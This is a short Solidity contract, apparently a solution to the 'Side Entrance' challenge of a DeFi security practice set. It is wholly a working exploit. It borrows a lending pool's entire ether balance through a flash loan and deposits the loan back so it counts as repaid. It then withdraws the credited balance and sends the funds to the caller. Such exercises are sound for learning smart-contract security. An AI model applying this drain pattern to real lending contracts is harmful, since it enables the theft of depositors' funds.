pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    ISideEntranceLenderPool private pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }

    function withdraw() external {
        pool.withdraw();
        uint256 balance = address(this).balance;
        (bool success, ) = payable(msg.sender).call{value: balance}("");
        require(success, "SideEntranceAttacker: transfer failed");
    }

    receive() external payable {}
}
